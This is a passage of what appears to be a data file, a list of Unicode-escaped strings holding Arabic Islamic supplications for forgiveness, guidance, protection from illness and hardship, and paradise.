  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0634\u0642\u0627\u0642 \u0648\u0627\u0644\u0646\u0641\u0627\u0642 \u0648\u0633\u0648\u0621 \u0627\u0644\u0623\u062E\u0644\u0627\u0642",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0635\u0645\u0645 \u0648\u0627\u0644\u0628\u0643\u0645 \u0648\u0627\u0644\u062C\u0646\u0648\u0646 \u0648\u0627\u0644\u062C\u0630\u0627\u0645 \u0648\u0627\u0644\u0628\u0631\u0635 \u0648\u0633\u064A\u0626 \u0627\u0644\u0623\u0633\u0642\u0627\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0642\u0633\u0648\u0629 \u0648\u0627\u0644\u063A\u0641\u0644\u0629 \u0648\u0627\u0644\u0639\u064A\u0644\u0629 \u0648\u0627\u0644\u0630\u0644\u0629 \u0648\u0627\u0644\u0645\u0633\u0643\u0646\u0629 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0641\u0642\u0631 \u0648\u0627\u0644\u0643\u0641\u0631 \u0648\u0627\u0644\u0641\u0633\u0648\u0642 \u0648\u0627\u0644\u0634\u0642\u0627\u0642 \u0648\u0627\u0644\u0646\u0641\u0627\u0642 \u0648\u0627\u0644\u0633\u0645\u0639\u0629 \u0648\u0627\u0644\u0631\u064A\u0627\u0621 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0635\u0645\u0645 \u0648\u0627\u0644\u0628\u0643\u0645 \u0648\u0627\u0644\u062C\u0646\u0648\u0646 \u0648\u0627\u0644\u062C\u0630\u0627\u0645 \u0648\u0627\u0644\u0628\u0631\u0635 \u0648\u0633\u064A\u0626 \u0627\u0644\u0623\u0633\u0642\u0627\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u0647\u062F\u0649 \u0648\u0627\u0644\u062A\u0642\u0649 \u0648\u0627\u0644\u0639\u0641\u0627\u0641 \u0648\u0627\u0644\u063A\u0646\u0649",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u0648\u0627\u0631\u062D\u0645\u0646\u064A \u0648\u0627\u0647\u062F\u0646\u064A \u0648\u0639\u0627\u0641\u0646\u064A \u0648\u0627\u0631\u0632\u0642\u0646\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u062C\u0647\u062F \u0627\u0644\u0628\u0644\u0627\u0621\u060C \u0648\u062F\u0631\u0643 \u0627\u0644\u0634\u0642\u0627\u0621\u060C \u0648\u0633\u0648\u0621 \u0627\u0644\u0642\u0636\u0627\u0621\u060C \u0648\u0634\u0645\u0627\u062A\u0629 \u0627\u0644\u0623\u0639\u062F\u0627\u0621",
  "\u0627\u0644\u0644\u0647\u0645 \u0623\u0635\u0644\u062D \u0644\u064A \u062F\u064A\u0646\u064A \u0627\u0644\u0630\u064A \u0647\u0648 \u0639\u0635\u0645\u0629 \u0623\u0645\u0631\u064A\u060C \u0648\u0623\u0635\u0644\u062D \u0644\u064A \u062F\u0646\u064A\u0627\u064A \u0627\u0644\u062A\u064A \u0641\u064A\u0647\u0627 \u0645\u0639\u0627\u0634\u064A\u060C \u0648\u0623\u0635\u0644\u062D \u0644\u064A \u0622\u062E\u0631\u062A\u064A \u0627\u0644\u062A\u064A \u0641\u064A\u0647\u0627 \u0645\u0639\u0627\u062F\u064A\u060C \u0648\u0627\u062C\u0639\u0644 \u0627\u0644\u062D\u064A\u0627\u0629 \u0632\u064A\u0627\u062F\u0629 \u0644\u064A \u0641\u064A \u0643\u0644 \u062E\u064A\u0631\u060C \u0648\u0627\u062C\u0639\u0644 \u0627\u0644\u0645\u0648\u062A \u0631\u0627\u062D\u0629 \u0644\u064A \u0645\u0646 \u0643\u0644 \u0634\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0645\u0646 \u0627\u0644\u062E\u064A\u0631 \u0643\u0644\u0647 \u0639\u0627\u062C\u0644\u0647 \u0648\u0622\u062C\u0644\u0647 \u0645\u0627 \u0639\u0644\u0645\u062A \u0645\u0646\u0647 \u0648\u0645\u0627 \u0644\u0645 \u0623\u0639\u0644\u0645\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0634\u0631 \u0643\u0644\u0647 \u0639\u0627\u062C\u0644\u0647 \u0648\u0622\u062C\u0644\u0647 \u0645\u0627 \u0639\u0644\u0645\u062A \u0645\u0646\u0647 \u0648\u0645\u0627 \u0644\u0645 \u0623\u0639\u0644\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0645\u0646 \u062E\u064A\u0631 \u0645\u0627 \u0633\u0623\u0644\u0643 \u0639\u0628\u062F\u0643 \u0648\u0646\u0628\u064A\u0643\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0645\u0627 \u0639\u0627\u0630 \u0628\u0647 \u0639\u0628\u062F\u0643 \u0648\u0646\u0628\u064A\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062C\u0646\u0629 \u0648\u0645\u0627 \u0642\u0631\u0628 \u0625\u0644\u064A\u0647\u0627 \u0645\u0646 \u0642\u0648\u0644 \u0623\u0648 \u0639\u0645\u0644\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0646\u0627\u0631 \u0648\u0645\u0627 \u0642\u0631\u0628 \u0625\u0644\u064A\u0647\u0627 \u0645\u0646 \u0642\u0648\u0644 \u0623\u0648 \u0639\u0645\u0644\u060C \u0648\u0623\u0633\u0623\u0644\u0643 \u0623\u0646 \u062A\u062C\u0639\u0644 \u0643\u0644 \u0642\u0636\u0627\u0621 \u0642\u0636\u064A\u062A\u0647 \u0644\u064A \u062E\u064A\u0631\u0627\u064B",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0639\u0644\u0645 \u0644\u0627 \u064A\u0646\u0641\u0639\u060C \u0648\u0645\u0646 \u0642\u0644\u0628 \u0644\u0627 \u064A\u062E\u0634\u0639\u060C \u0648\u0645\u0646 \u0646\u0641\u0633 \u0644\u0627 \u062A\u0634\u0628\u0639\u060C \u0648\u0645\u0646 \u062F\u0639\u0648\u0629 \u0644\u0627 \u064A\u0633\u062A\u062C\u0627\u0628 \u0644\u0647\u0627",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u0643\u0641\u0646\u064A \u0628\u062D\u0644\u0627\u0644\u0643 \u0639\u0646 \u062D\u0631\u0627\u0645\u0643\u060C \u0648\u0623\u063A\u0646\u0646\u064A \u0628\u0641\u0636\u0644\u0643 \u0639\u0645\u0646 \u0633\u0648\u0627\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062B\u0628\u0627\u062A \u0641\u064A \u0627\u0644\u0623\u0645\u0631\u060C \u0648\u0627\u0644\u0639\u0632\u064A\u0645\u0629 \u0639\u0644\u0649 \u0627\u0644\u0631\u0634\u062F\u060C \u0648\u0623\u0633\u0623\u0644\u0643 \u0645\u0648\u062C\u0628\u0627\u062A \u0631\u062D\u0645\u062A\u0643\u060C \u0648\u0639\u0632\u0627\u0626\u0645 \u0645\u063A\u0641\u0631\u062A\u0643\u060C \u0648\u0623\u0633\u0623\u0644\u0643 \u0634\u0643\u0631 \u0646\u0639\u0645\u062A\u0643\u060C \u0648\u062D\u0633\u0646 \u0639\u0628\u0627\u062F\u062A\u0643\u060C \u0648\u0623\u0633\u0623\u0644\u0643 \u0642\u0644\u0628\u0627\u064B \u0633\u0644\u064A\u0645\u0627\u064B\u060C \u0648\u0644\u0633\u0627\u0646\u0627\u064B \u0635\u0627\u062F\u0642\u0627\u064B\u060C \u0648\u0623\u0633\u0623\u0644\u0643 \u0645\u0646 \u062E\u064A\u0631 \u0645\u0627 \u062A\u0639\u0644\u0645\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0645\u0627 \u062A\u0639\u0644\u0645\u060C \u0648\u0623\u0633\u062A\u063A\u0641\u0631\u0643 \u0644\u0645\u0627 \u062A\u0639\u0644\u0645\u060C \u0625\u0646\u0643 \u0623\u0646\u062A \u0639\u0644\u0627\u0645 \u0627\u0644\u063A\u064A\u0648\u0628",
  "\u0627\u0644\u0644\u0647\u0645 \u0631\u0628 \u0627\u0644\u0633\u0645\u0627\u0648\u0627\u062A \u0648\u0631\u0628 \u0627\u0644\u0623\u0631\u0636 \u0648\u0631\u0628 \u0627\u0644\u0639\u0631\u0634 \u0627\u0644\u0639\u0638\u064A\u0645\u060C \u0631\u0628\u0646\u0627 \u0648\u0631\u0628 \u0643\u0644 \u0634\u064A\u0621\u060C \u0641\u0627\u0644\u0642 \u0627\u0644\u062D\u0628 \u0648\u0627\u0644\u0646\u0648\u0649\u060C \u0648\u0645\u0646\u0632\u0644 \u0627\u0644\u062A\u0648\u0631\u0627\u0629 \u0648\u0627\u0644\u0625\u0646\u062C\u064A\u0644 \u0648\u0627\u0644\u0641\u0631\u0642\u0627\u0646\u060C \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0643\u0644 \u0634\u064A\u0621 \u0623\u0646\u062A \u0622\u062E\u0630 \u0628\u0646\u0627\u0635\u064A\u062A\u0647\u060C \u0627\u0644\u0644\u0647\u0645 \u0623\u0646\u062A \u0627\u0644\u0623\u0648\u0644 \u0641\u0644\u064A\u0633 \u0642\u0628\u0644\u0643 \u0634\u064A\u0621\u060C \u0648\u0623\u0646\u062A \u0627\u0644\u0622\u062E\u0631 \u0641\u0644\u064A\u0633 \u0628\u0639\u062F\u0643 \u0634\u064A\u0621\u060C \u0648\u0623\u0646\u062A \u0627\u0644\u0638\u0627\u0647\u0631 \u0641\u0644\u064A\u0633 \u0641\u0648\u0642\u0643 \u0634\u064A\u0621\u060C \u0648\u0623\u0646\u062A \u0627\u0644\u0628\u0627\u0637\u0646 \u0641\u0644\u064A\u0633 \u062F\u0648\u0646\u0643 \u0634\u064A\u0621\u060C \u0627\u0642\u0636 \u0639\u0646\u0627 \u0627\u0644\u062F\u064A\u0646 \u0648\u0623\u063A\u0646\u0646\u0627 \u0645\u0646 \u0627\u0644\u0641\u0642\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u0630\u0646\u0628\u064A \u0643\u0644\u0647\u060C \u062F\u0642\u0647 \u0648\u062C\u0644\u0647\u060C \u0648\u0623\u0648\u0644\u0647 \u0648\u0622\u062E\u0631\u0647\u060C \u0648\u0639\u0644\u0627\u0646\u064A\u062A\u0647 \u0648\u0633\u0631\u0647",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0631\u0636\u0627\u0643 \u0645\u0646 \u0633\u062E\u0637\u0643\u060C \u0648\u0628\u0645\u0639\u0627\u0641\u0627\u062A\u0643 \u0645\u0646 \u0639\u0642\u0648\u0628\u062A\u0643\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646\u0643 \u0644\u0627 \u0623\u062D\u0635\u064A \u062B\u0646\u0627\u0621 \u0639\u0644\u064A\u0643 \u0623\u0646\u062A \u0643\u0645\u0627 \u0623\u062B\u0646\u064A\u062A \u0639\u0644\u0649 \u0646\u0641\u0633\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0628\u0631\u0635 \u0648\u0627\u0644\u062C\u0646\u0648\u0646 \u0648\u0627\u0644\u062C\u0630\u0627\u0645 \u0648\u0645\u0646 \u0633\u064A\u0626 \u0627\u0644\u0623\u0633\u0642\u0627\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0645\u0646\u0643\u0631\u0627\u062A \u0627\u0644\u0623\u062E\u0644\u0627\u0642 \u0648\u0627\u0644\u0623\u0639\u0645\u0627\u0644 \u0648\u0627\u0644\u0623\u0647\u0648\u0627\u0621",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u0643 \u0639\u0641\u0648 \u0643\u0631\u064A\u0645 \u062A\u062D\u0628 \u0627\u0644\u0639\u0641\u0648 \u0641\u0627\u0639\u0641 \u0639\u0646\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u062D\u0628\u0643 \u0648\u062D\u0628 \u0645\u0646 \u064A\u062D\u0628\u0643 \u0648\u0627\u0644\u0639\u0645\u0644 \u0627\u0644\u0630\u064A \u064A\u0628\u0644\u063A\u0646\u064A \u062D\u0628\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u062C\u0639\u0644 \u062D\u0628\u0643 \u0623\u062D\u0628 \u0625\u0644\u064A \u0645\u0646 \u0646\u0641\u0633\u064A \u0648\u0623\u0647\u0644\u064A \u0648\u0645\u0646 \u0627\u0644\u0645\u0627\u0621 \u0627\u0644\u0628\u0627\u0631\u062F",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0641\u0648\u0627\u062A\u062D \u0627\u0644\u062E\u064A\u0631 \u0648\u062E\u0648\u0627\u062A\u0645\u0647 \u0648\u062C\u0648\u0627\u0645\u0639\u0647 \u0648\u0623\u0648\u0644\u0647 \u0648\u0622\u062E\u0631\u0647 \u0648\u0638\u0627\u0647\u0631\u0647 \u0648\u0628\u0627\u0637\u0646\u0647 \u0648\u0627\u0644\u062F\u0631\u062C\u0627\u062A \u0627\u0644\u0639\u0644\u0649 \u0645\u0646 \u0627\u0644\u062C\u0646\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0623\u0646 \u062A\u0631\u0641\u0639 \u0630\u0643\u0631\u064A \u0648\u062A\u0636\u0639 \u0648\u0632\u0631\u064A \u0648\u062A\u0637\u0647\u0631 \u0642\u0644\u0628\u064A \u0648\u062A\u0635\u0646 \u0641\u0631\u062C\u064A \u0648\u062A\u063A\u0641\u0631 \u0644\u064A \u0630\u0646\u0628\u064A \u0648\u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062F\u0631\u062C\u0627\u062A \u0627\u0644\u0639\u0644\u0649 \u0645\u0646 \u0627\u0644\u062C\u0646\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0623\u0646 \u062A\u0628\u0627\u0631\u0643 \u0641\u064A \u0646\u0641\u0633\u064A \u0648\u0641\u064A \u0633\u0645\u0639\u064A \u0648\u0641\u064A \u0628\u0635\u0631\u064A \u0648\u0641\u064A \u0631\u0648\u062D\u064A \u0648\u0641\u064A \u062E\u0644\u0642\u064A \u0648\u0641\u064A \u062E\u0644\u0642\u064A \u0648\u0641\u064A \u0623\u0647\u0644\u064A \u0648\u0641\u064A \u0645\u062D\u064A\u0627\u064A \u0648\u0641\u064A \u0645\u0645\u0627\u062A\u064A \u0648\u0641\u064A \u0639\u0645\u0644\u064A \u0641\u062A\u0642\u0628\u0644 \u062D\u0633\u0646\u0627\u062A\u064A \u0648\u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062F\u0631\u062C\u0627\u062A \u0627\u0644\u0639\u0644\u0649 \u0645\u0646 \u0627\u0644\u062C\u0646\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0645\u0627 \u0639\u0645\u0644\u062A \u0648\u0645\u0646 \u0634\u0631 \u0645\u0627 \u0644\u0645 \u0623\u0639\u0645\u0644",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u063A\u0644\u0628\u0629 \u0627\u0644\u062F\u064A\u0646 \u0648\u063A\u0644\u0628\u0629 \u0627\u0644\u0639\u062F\u0648 \u0648\u0634\u0645\u0627\u062A\u0629 \u0627\u0644\u0623\u0639\u062F\u0627\u0621",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u0648\u0627\u0631\u062D\u0645\u0646\u064A \u0648\u0623\u0644\u062D\u0642\u0646\u064A \u0628\u0627\u0644\u0631\u0641\u064A\u0642 \u0627\u0644\u0623\u0639\u0644\u0649",
  "\u0627\u0644\u0644\u0647\u0645 \u0622\u062A\u0646\u0627 \u0641\u064A \u0627\u0644\u062F\u0646\u064A\u0627 \u062D\u0633\u0646\u0629 \u0648\u0641\u064A \u0627\u0644\u0622\u062E\u0631\u0629 \u062D\u0633\u0646\u0629 \u0648\u0642\u0646\u0627 \u0639\u0630\u0627\u0628 \u0627\u0644\u0646\u0627\u0631",
  "\u0633\u064F\u0628\u0652\u062D\u064E\u0627\u0646\u064E \u0627\u0644\u0644\u0647\u0650 \u0648\u064E\u0628\u0650\u062D\u064E\u0645\u0652\u062F\u0650\u0647\u0650: \u0639\u064E\u062F\u064E\u062F\u064E \u062E\u064E\u0644\u0652\u0642\u0650\u0647\u0650\u060C \u0648\u064E\u0631\u0650\u0636\u064E\u0627 \u0646\u064E\u0641\u0652\u0633\u0650\u0647\u0650\u060C \u0648\u064E\u0632\u0650\u0646\u064E\u0629\u064E \u0639\u064E\u0631\u0652\u0634\u0650\u0647\u0650\u060C \u0648\u064E\u0645\u0650\u062F\u064E\u0627\u062F\u064E \u0643\u064E\u0644\u0650\u0645\u064E\u0627\u062A\u0650\u0647\u0650",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0641\u0642\u0631 \u0648\u0627\u0644\u0642\u0644\u0629 \u0648\u0627\u0644\u0630\u0644\u0629\u060C \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0623\u0646 \u0623\u0638\u0644\u0645 \u0623\u0648 \u0623\u0638\u0644\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u062C\u0627\u0631 \u0627\u0644\u0633\u0648\u0621 \u0641\u064A \u062F\u0627\u0631 \u0627\u0644\u0645\u0642\u0627\u0645\u0629 \u0641\u0625\u0646 \u062C\u0627\u0631 \u0627\u0644\u0628\u0627\u062F\u064A\u0629 \u064A\u062A\u062D\u0648\u0644",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0642\u0644\u0628 \u0644\u0627 \u064A\u062E\u0634\u0639 \u0648\u0645\u0646 \u062F\u0639\u0627\u0621 \u0644\u0627 \u064A\u0633\u0645\u0639 \u0648\u0645\u0646 \u0646\u0641\u0633 \u0644\u0627 \u062A\u0634\u0628\u0639 \u0648\u0645\u0646 \u0639\u0644\u0645 \u0644\u0627 \u064A\u0646\u0641\u0639\u060C \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0647\u0624\u0644\u0627\u0621 \u0627\u0644\u0623\u0631\u0628\u0639",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u064A\u0648\u0645 \u0627\u0644\u0633\u0648\u0621 \u0648\u0645\u0646 \u0644\u064A\u0644\u0629 \u0627\u0644\u0633\u0648\u0621 \u0648\u0645\u0646 \u0633\u0627\u0639\u0629 \u0627\u0644\u0633\u0648\u0621 \u0648\u0645\u0646 \u0635\u0627\u062D\u0628 \u0627\u0644\u0633\u0648\u0621 \u0648\u0645\u0646 \u062C\u0627\u0631 \u0627\u0644\u0633\u0648\u0621 \u0641\u064A \u062F\u0627\u0631 \u0627\u0644\u0645\u0642\u0627\u0645\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062C\u0646\u0629 \u0648\u0623\u0633\u062A\u062C\u064A\u0631 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0646\u0627\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0641\u0642\u0647\u0646\u064A \u0641\u064A \u0627\u0644\u062F\u064A\u0646",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0623\u0646 \u0623\u0634\u0631\u0643 \u0628\u0643 \u0648\u0623\u0646\u0627 \u0623\u0639\u0644\u0645 \u0648\u0623\u0633\u062A\u063A\u0641\u0631\u0643 \u0644\u0645\u0627 \u0644\u0627 \u0623\u0639\u0644\u0645",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u0646\u0641\u0639\u0646\u064A \u0628\u0645\u0627 \u0639\u0644\u0645\u062A\u0646\u064A \u0648\u0639\u0644\u0645\u0646\u064A \u0645\u0627 \u064A\u0646\u0641\u0639\u0646\u064A \u0648\u0632\u062F\u0646\u064A \u0639\u0644\u0645\u0627\u064B",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0625\u064A\u0645\u0627\u0646\u0627\u064B \u0644\u0627 \u064A\u0631\u062A\u062F \u0648\u0646\u0639\u064A\u0645\u0627\u064B \u0644\u0627 \u064A\u0646\u0641\u062F \u0648\u0645\u0631\u0627\u0641\u0642\u0629 \u0645\u062D\u0645\u062F \u0635\u0644\u0649 \u0627\u0644\u0644\u0647 \u0639\u0644\u064A\u0647 \u0648\u0633\u0644\u0645 \u0641\u064A \u0623\u0639\u0644\u0649 \u062C\u0646\u0629 \u0627\u0644\u062E\u0644\u062F",
  "\u0627\u0644\u0644\u0647\u0645 \u0642\u0646\u064A \u0634\u0631 \u0646\u0641\u0633\u064A \u0648\u0627\u0639\u0632\u0645 \u0644\u064A \u0639\u0644\u0649 \u0623\u0631\u0634\u062F \u0623\u0645\u0631\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0627\u063A\u0641\u0631 \u0644\u064A \u0645\u0627 \u0623\u0633\u0631\u0631\u062A \u0648\u0645\u0627 \u0623\u0639\u0644\u0646\u062A \u0648\u0645\u0627 \u0623\u062E\u0637\u0623\u062A \u0648\u0645\u0627 \u0639\u0645\u062F\u062A \u0648\u0645\u0627 \u0639\u0644\u0645\u062A \u0648\u0645\u0627 \u062C\u0647\u0644\u062A",
  "\u0627\u0644\u0644\u0647\u0645 \u062D\u0627\u0633\u0628\u0646\u064A \u062D\u0633\u0627\u0628\u0627\u064B \u064A\u0633\u064A\u0631\u0627\u064B",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0641\u0639\u0644 \u0627\u0644\u062E\u064A\u0631\u0627\u062A \u0648\u062A\u0631\u0643 \u0627\u0644\u0645\u0646\u0643\u0631\u0627\u062A \u0648\u062D\u0628 \u0627\u0644\u0645\u0633\u0627\u0643\u064A\u0646 \u0648\u0623\u0646 \u062A\u063A\u0641\u0631 \u0644\u064A \u0648\u062A\u0631\u062D\u0645\u0646\u064A \u0648\u0625\u0630\u0627 \u0623\u0631\u062F\u062A \u0641\u062A\u0646\u0629 \u0642\u0648\u0645 \u0641\u062A\u0648\u0641\u0646\u064A \u063A\u064A\u0631 \u0645\u0641\u062A\u0648\u0646",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u062D\u0628\u0643 \u0648\u062D\u0628 \u0645\u0646 \u064A\u062D\u0628\u0643 \u0648\u062D\u0628 \u0639\u0645\u0644 \u064A\u0642\u0631\u0628\u0646\u064A \u0625\u0644\u0649 \u062D\u0628\u0643",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u062E\u064A\u0631 \u0627\u0644\u0645\u0633\u0623\u0644\u0629 \u0648\u062E\u064A\u0631 \u0627\u0644\u062F\u0639\u0627\u0621 \u0648\u062E\u064A\u0631 \u0627\u0644\u0646\u062C\u0627\u062D \u0648\u062E\u064A\u0631 \u0627\u0644\u0639\u0645\u0644 \u0648\u062E\u064A\u0631 \u0627\u0644\u062B\u0648\u0627\u0628 \u0648\u062E\u064A\u0631 \u0627\u0644\u062D\u064A\u0627\u0629 \u0648\u062E\u064A\u0631 \u0627\u0644\u0645\u0645\u0627\u062A \u0648\u062B\u0628\u062A\u0646\u064A \u0648\u062B\u0642\u0644 \u0645\u0648\u0627\u0632\u064A\u0646\u064A \u0648\u062D\u0642\u0642 \u0625\u064A\u0645\u0627\u0646\u064A \u0648\u0627\u0631\u0641\u0639 \u062F\u0631\u062C\u0627\u062A\u064A \u0648\u062A\u0642\u0628\u0644 \u0635\u0644\u0627\u062A\u064A \u0648\u0627\u063A\u0641\u0631 \u062E\u0637\u064A\u0626\u062A\u064A \u0648\u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u062F\u0631\u062C\u0627\u062A \u0627\u0644\u0639\u0644\u0649 \u0645\u0646 \u0627\u0644\u062C\u0646\u0629",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0633\u0623\u0644\u0643 \u0627\u0644\u0647\u062F\u0649 \u0648\u0627\u0644\u0633\u062F\u0627\u062F",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0639\u062C\u0632 \u0648\u0627\u0644\u0643\u0633\u0644 \u0648\u0627\u0644\u062C\u0628\u0646 \u0648\u0627\u0644\u0628\u062E\u0644 \u0648\u0627\u0644\u0647\u0631\u0645 \u0648\u0639\u0630\u0627\u0628 \u0627\u0644\u0642\u0628\u0631",
  "\u0627\u0644\u0644\u0647\u0645 \u0622\u062A \u0646\u0641\u0633\u064A \u062A\u0642\u0648\u0627\u0647\u0627 \u0648\u0632\u0643\u0647\u0627 \u0623\u0646\u062A \u062E\u064A\u0631 \u0645\u0646 \u0632\u0643\u0627\u0647\u0627 \u0623\u0646\u062A \u0648\u0644\u064A\u0647\u0627 \u0648\u0645\u0648\u0644\u0627\u0647\u0627",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0639\u0644\u0645 \u0644\u0627 \u064A\u0646\u0641\u0639 \u0648\u0645\u0646 \u0642\u0644\u0628 \u0644\u0627 \u064A\u062E\u0634\u0639 \u0648\u0645\u0646 \u0646\u0641\u0633 \u0644\u0627 \u062A\u0634\u0628\u0639 \u0648\u0645\u0646 \u062F\u0639\u0648\u0629 \u0644\u0627 \u064A\u0633\u062A\u062C\u0627\u0628 \u0644\u0647\u0627",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0634\u0631 \u0633\u0645\u0639\u064A \u0648\u0645\u0646 \u0634\u0631 \u0628\u0635\u0631\u064A \u0648\u0645\u0646 \u0634\u0631 \u0644\u0633\u0627\u0646\u064A \u0648\u0645\u0646 \u0634\u0631 \u0642\u0644\u0628\u064A \u0648\u0645\u0646 \u0634\u0631 \u0645\u0646\u064A\u064A",
  "\u0627\u0644\u0644\u0647\u0645 \u0625\u0646\u064A \u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u0647\u062F\u0645 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u062A\u0631\u062F\u064A \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0645\u0646 \u0627\u0644\u063A\u0631\u0642 \u0648\u0627\u0644\u062D\u0631\u0642 \u0648\u0627\u0644\u0647\u0631\u0645 \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0623\u0646 \u064A\u062A\u062E\u0628\u0637\u0646\u064A \u0627\u0644\u0634\u064A\u0637\u0627\u0646 \u0639\u0646\u062F \u0627\u0644\u0645\u0648\u062A \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0623\u0646 \u0623\u0645\u0648\u062A \u0641\u064A \u0633\u0628\u064A\u0644\u0643 \u0645\u062F\u0628\u0631\u0627\u064B \u0648\u0623\u0639\u0648\u0630 \u0628\u0643 \u0623\u0646 \u0623\u0645\u0648\u062A \u0644\u062F\u064A\u063A\u0627\u064B",
